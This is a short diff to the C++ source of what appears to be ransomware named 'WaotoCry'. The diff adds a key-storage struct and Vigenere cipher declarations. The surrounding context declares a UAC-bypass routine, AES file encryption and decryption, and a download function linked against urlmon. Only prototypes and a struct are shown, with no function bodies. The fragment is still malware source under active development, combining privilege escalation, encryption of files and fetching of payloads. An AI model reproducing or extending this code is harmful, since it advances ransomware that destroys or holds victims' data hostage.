@@ -7,12 +7,12 @@
 #include <tchar.h>
 #include "resource.h"
 #pragma comment(lib,"URlmon")
-
 #pragma warning(disable :4996)
+#define MAX_SIZE 255
 
 using namespace std;
 
-#define MAX_SIZE 255
+
 
 
 typedef struct 
@@ -29,6 +29,16 @@ typedef struct
 	BOOL off;
 }WaotoCry;
 
+typedef struct {
+	string public_key;
+	string private_key;
+	string encryption_data;
+	string uncryption_data;
+}WaotoCry_encryption;
+
+
+
+
 
 //static string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";
 static string file_Config_dir = "C:\\Process File\\dD0bB0";
@@ -44,7 +54,9 @@ int BypassUAC();
 int Encryption(char process_path);
 int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength);//? AES加密模块
 int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength); //? AES解密模块
-
+std::string extend_key(std::string& msg, std::string& key); //? vigenere创建新密钥模块
+std::string encrypt_vigenere(std::string& msg, std::string& key); //? vigenere 加密模块
+std::string decrypt_vigenere(std::string& encryptedMsg, std::string& newKey); //? vigenere 解密模块
 
 //Connect
 int download(string usl, string file_name);
